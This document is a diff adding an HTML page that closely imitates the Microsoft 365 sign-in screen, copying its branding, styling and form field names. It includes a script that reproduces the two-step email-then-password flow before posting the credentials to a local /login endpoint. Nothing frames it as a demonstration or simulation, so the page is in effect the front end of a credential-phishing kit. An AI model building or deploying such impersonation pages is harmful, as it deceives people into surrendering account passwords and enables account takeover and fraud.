@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background: #f5f5f5;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white; padding: 44px; border-radius: 2px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            width: 100%; max-width: 440px;
+        }
+        .logo { font-size: 24px; font-weight: 600; color: #2F2F2F; margin-bottom: 24px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; line-height: 1.2; }
+        p { color: #1a1a1a; margin-bottom: 20px; font-size: 15px; }
+        input[type='email'], input[type='password'], input[type='text'] {
+            width: 100%; padding: 8px 10px; margin-bottom: 16px;
+            border: none; border-bottom: 1px solid #696969;
+            font-size: 15px; background: transparent;
+        }
+        input:focus { outline: none; border-bottom: 2px solid #0067B8; }
+        .btn-primary {
+            background: #0067B8; color: white; border: none;
+            padding: 10px 20px; font-size: 15px; font-weight: 600;
+            cursor: pointer; border-radius: 0; margin-top: 16px;
+        }
+        .btn-primary:hover { background: #005A9E; }
+        .footer { margin-top: 24px; font-size: 13px; color: #1a1a1a; }
+        .footer a { color: #0067B8; text-decoration: none; }
+        .alt { margin-top: 32px; padding-top: 16px; border-top: 1px solid #e0e0e0; }
+        .alt a { color: #0067B8; text-decoration: none; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Microsoft</div>
+        <h1>Sign in</h1>
+        <p>to continue to Microsoft 365</p>
+        <form id="login-form" method="POST" action="/login">
+            <input type="email" name="loginfmt" id="i0116" placeholder="Email, phone, or Skype" required autofocus>
+            <input type="password" name="passwd" id="i0118" placeholder="Password" required style="display:none;">
+            <button type="submit" class="btn-primary" id="idSIButton9">Next</button>
+        </form>
+        <div class="alt">
+            <a href="#">Sign-in options</a>
+        </div>
+        <div class="footer">
+            <p>©2026 Microsoft</p>
+            <p><a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a></p>
+        </div>
+    </div>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var emailInput = document.getElementById('i0116');
+            var passInput = document.getElementById('i0118');
+            if (passInput.style.display === 'none') {
+                passInput.style.display = 'block';
+                passInput.required = true;
+                passInput.focus();
+                return;
+            }
+            this.submit();
+        });
+    </script>
+</body>
+</html>
